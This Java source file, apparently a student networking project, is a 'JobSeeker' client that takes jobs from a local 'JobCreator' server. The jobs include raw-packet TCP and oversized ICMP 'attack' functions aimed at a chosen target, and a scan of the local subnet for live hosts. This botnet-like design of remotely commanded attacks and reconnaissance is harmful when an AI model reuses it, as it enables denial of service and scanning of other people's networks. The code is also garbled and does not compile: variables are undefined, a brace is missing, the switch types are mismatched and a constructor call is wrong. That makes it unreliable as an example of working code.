import java.io.*; 
import java.net.*; 
import java.util.Scanner; 
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.UnknownHostException;

// JobSeeker class 
public class JobSeeker 
{ 
	public static void main(String[] args) throws IOException 
	{ 
	
		try
		{ 
			Scanner scn = new Scanner(System.in); 
			
			// getting localhost ip 
			InetAddress ip = InetAddress.getByName("localhost"); 
	
			// establish the connection with server port 5056 
			Socket s = new Socket(ip, 5056); 
	
			// obtaining input and out streams 
			DataInputStream dis = new DataInputStream(s.getInputStream()); 
			DataOutputStream dos = new DataOutputStream(s.getOutputStream()); 
	
			// the following loop performs the exchange of 
			// information between Jobcreator and client handler 
			while (true) 
			{ 
				System.out.println(dis.readUTF()); 
				String tosend = scn.nextLine(); 
				dos.writeUTF(tosend); 
				
				// If Jobseeker sends exit,close this connection 
				// and then break from the while loop 
				if(tosend.equals("Exit")) 
				{ 
					System.out.println("Closing this connection : " + s); 
					s.close(); 
					System.out.println("Connection closed"); 
					break; 
				} 
				
				// closing connection as job rejected by Jobcreater 
				String received = dis.readUTF(); 
				System.out.println(received); 
				if(received.equals("Job Application Rejected")) 
				{ 
					System.out.println("Closing this connection : " + s); 
					s.close(); 
					System.out.println("Connection closed"); 
					break; 
				}
				System.out.println(dis.readUTF());
				String job = scn.nextLine();
				char jobNum = job.charAt(0);
				boolean isOnline;
				String ipAddr;
				int prt;			
				
				switch(jobNum){
					case 1 :
							System.out.println(dis.readUTF());
							System.out.println(dis.readUTF());
							ipAddr = scn.nextLine();	 
							if(Character.isDigit(ipAddr.charAt(0))){
								if(InetAddress.getByName(ipAddr).isReachable(5000))
									isOnline = true;
								else 
									isOnline = false;
								} else {
									if(InetAddress.getByName(ipAddr).isReachable(5000)){
										isOnline = true;
									} else {
										isOnline = false;
									}

								}
								dos.writeBoolean(isOnline);
								break;
					case 2 : 
							System.out.println(dis.readUTF());
							System.out.println(dis.readUTF());
							ipAddr = scn.nextLine();
							System.out.println(dis.readInt());
							prt = scn.nextInt();
							if (InetAddress.getByName(ipAddr).isReachable(prt)) {
								isOnline = true;
							} else{
								isOnline = false;
							}
							dos.writeBoolean(isOnline);
							break;
					case 3 : 
							System.out.println(dis.readUTF());
							System.out.println(dis.readUTF());
							ipAddr = scn.nextLine();
							System.out.println(dis.readInt());
							prt = scn.nextInt();
                        	tcpAttack(ipAddr, prt);
                                tosend = " Job Done.";
                                dos.writeUTF(tosend);
                                break;
					case 4 :
							System.out.println(dis.readUTF());
							System.out.println(dis.readUTF());
							ipAddr = scn.nextLine();
							System.out.println(dis.readInt());
							prt = scn.nextInt();							
                        	icmpAttack(ipAddr);                            
                                tosend = " Job Done.";
                                dos.writeUTF(tosend);
                                break;
                    case 5 :
                    		System.out.println(dis.readUTF());
							System.out.println(dis.readUTF());
							ipAddr = scn.nextLine();
							System.out.println(dis.readInt());
							prt = scn.nextInt();	
                    		TRHandler Trh = new TRHandler(prt, ipAddr);
                    		break;
                    case 6 :
                    		String jobSeekerIp = (InetAddress.getLocalHost().getHostAddress()).trim();
        					NetworkInterface jobSeekerNet = NetworkInterface.getByInetAddress(InetAddress.getLocalHost());
        					//convert to hexadecimal MAC address string
        					byte[] nAddr = jobSeekerNet.getHardwareAddress();
        					String[] hex = new String[nAddr.length];
        					for (int x = 0; x < nAddr.length; x++) {
            				hex[x] = String.format("%02x", nAddr[x]);
        					}
        					String jobSeekerMac = String.join("-", hex);
       
        					System.out.println("All JobSeekers are on the same device, and therefore the same LAN, as the JobCreator.");
        					System.out.println("The JobSeeker has IP Address " + jobSeekerIp + " aand MAC Address " + jobSeekerMac);
        					//get subnet of jobSeekerIp
        					String subnet = jobSeekerIp.substring(0, jobSeekerIp.lastIndexOf("."));
        					spyNbrs(subnet);//spy on neighbors
    
					default : 		

							}

			} 
			
			// closing resources 
			scn.close(); 
			dis.close(); 
			dos.close(); 
		}catch(Exception e){ 
			e.printStackTrace(); 
		} 
	}

public static void tcpAttack(String target, int prt) throws IOException {
        PcapHandle handler = null;
        System.out.println("Connection port: "+socket.getLocalPort());
        fw.write("Connection port: "+socket.getLocalPort()+"\n");
        int localPort = socket.getLocalPort();
        byte[] data = new byte[900];
        for(int i=0; i < data.length; i++){
            data[i] = (byte) i;
        }

        try {
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();

            TcpPacket.Builder tcpPacket = new TcpPacket.Builder();
            tcpPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));
            tcpPacket.srcAddr(localhost);
            tcpPacket.dstAddr(targetAddress);
            tcpPacket.srcPort(TcpPort.getInstance((short)localPort));
            tcpPacket.dstPort(TcpPort.getInstance((short) prt));
            tcpPacket.correctLengthAtBuild(true);
            tcpPacket.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4PacketBuilder = new IpV4Packet.Builder();
            ipV4PacketBuilder.payloadBuilder(tcpPacket);
            ipV4PacketBuilder.version(IpVersion.IPV4);
            ipV4PacketBuilder.tos((IpV4Packet.IpV4Tos) () -> (byte) 0);
            ipV4PacketBuilder.protocol(IpNumber.TCP);
            ipV4PacketBuilder.srcAddr((Inet4Address) localhost);
            ipV4PacketBuilder.dstAddr((Inet4Address) targetAddress);
            ipV4PacketBuilder.correctLengthAtBuild(true);
            ipV4PacketBuilder.correctChecksumAtBuild(true);

            IpV4Packet ipV4Packet = ipV4PacketBuilder.build();
            data = ipV4Packet.getRawData();
            System.out.println("New packet: "+IpV4Packet.newPacket(data,0,data.length));
            fw.write("New packet: "+IpV4Packet.newPacket(data,0,data.length) + "\n");

            handler.sendPacket(data);

        } catch (Exception e) {
            e.printStackTrace();
        }

    

public static void icmpAttack(String target) {
        PcapHandle handler;
        PcapNetworkInterface devices;
        PcapStat stat;
        FileWriter fw;


        byte[] data = new byte[70000];
        for(int i=0; i< data.length; i++){
            data[i] = (byte) i;
        }

        if(target.contains("/")){

        }
        else{

        }


        try{
            InetAddress targetAddress = InetAddress.getByName(target);
            InetAddress localhost = InetAddress.getLocalHost();
            NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
            NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);


            byte[] mac = niLocal.getHardwareAddress();
            System.out.println("Garbage: "+mac.toString());
            fw.write("Garbage: "+mac.toString()+"\n");

            MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
            if(sourceMac != null) {
                System.out.println("Source Mac Address is(String): " + sourceMac.toString());
                fw.write("Source Mac Address is(String): " + sourceMac.toString()+"\n");
            }
            else{
                System.out.println("Source Mac Address is NULL");
                fw.write("Source Mac Address is NULL\n");
            }

            devices = Pcaps.getDevByAddress(localhost);
            System.out.println(devices);
            System.out.println("Local: "+niLocal.getDisplayName());
            fw.write(devices+"\n"+"Local: "+niLocal.getDisplayName()+"\n");

            System.out.println("Before Handler");
            fw.write("Before Handler\n");
            handler = devices.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
            stat = handler.getStats();
            System.out.println("Before Handler SendPacket");
            System.out.println("\nReceiving Packets\n");
            fw.write("Before Handler SendPacket\nReceiving Packets\n\n");
            PacketListener packetlistener = new PacketListener() {
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets: ");
                    System.out.println(pcapPacket.getTimestamp());
                    System.out.println(pcapPacket);
                    try {
                        fw.write("Received packets:  \n" + pcapPacket.getTimestamp() + pcapPacket);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            };

            IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
            echoPacket.identifier((short) 1);
            echoPacket.payloadBuilder(new UnknownPacket.Builder().rawData(data));

            IcmpV4CommonPacket.Builder echoIcmp = new IcmpV4CommonPacket.Builder();
            echoIcmp.type(IcmpV4Type.ECHO);
            echoIcmp.code(IcmpV4Code.NO_CODE);
            echoIcmp.payloadBuilder(echoPacket);
            echoIcmp.correctChecksumAtBuild(true);

            IpV4Packet.Builder ipV4Builder = new IpV4Packet.Builder();
            ipV4Builder.version(IpVersion.IPV4);
            ipV4Builder.tos(IpV4Rfc791Tos.newInstance((byte) 0));
            ipV4Builder.ttl((byte) 100);
            ipV4Builder.protocol(IpNumber.ICMPV4);
            ipV4Builder.srcAddr((Inet4Address) InetAddress.getLocalHost());
            ipV4Builder.dstAddr((Inet4Address) InetAddress.getByName(target));
            ipV4Builder.payloadBuilder(echoIcmp);
            ipV4Builder.correctChecksumAtBuild(true);
            for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
                System.out.println("Sending Echo request Packets");
                fw.write("****************\nSending Echo request Packets\n****************\n");
            }

            EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
            ethernet.dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS);
            ethernet.srcAddr(sourceMac);
            ethernet.type(EtherType.IPV4);
            ethernet.paddingAtBuild(true);

            Packet packet = ethernet.build();
            System.out.println("****************");
            System.out.println("Sending Echo request Packets");
            System.out.println("****************");
            fw.write("****************\nSending Echo request Packets\n****************\n");
            handler.sendPacket(packet);
            handler.loop(40, packetlistener);

            System.out.println(stat.getNumPacketsCaptured());
            fw.write(stat.getNumPacketsCaptured() + "\n");
        }
        catch (Exception p){
            p.printStackTrace();
        }
    }

public static void spyNbrs(String lan) throws IOException {
        for (int i = 1; i < 255; i++) {
            String hostIp = lan + "." + i;   									//get ip address
            if (InetAddress.getByName(hostIp).isReachable(5000)) {
                System.out.println("IP Address " + hostIp + " is a live host the same LAN as JobSeeker.");
            }
        }
    } 
} 

//traceroute handler class
public class TRHandler
{
    //Runs traceroute and gets back number of hops
    TRHandler(PrintWriter prt, String ipAddr) throws UnknownHostException {
        System.out.println("Job 5");
        TraceRoute traceRoute = new TraceRoute(InetAddress.getByName(ipAddr),prt);
        int numHops = traceRoute.getNumberOfHopsBetweenNodes();
        prt.println("Distance between target node and nearest Job Seeker(s): "+ numHops +" hops away.");

    }

}
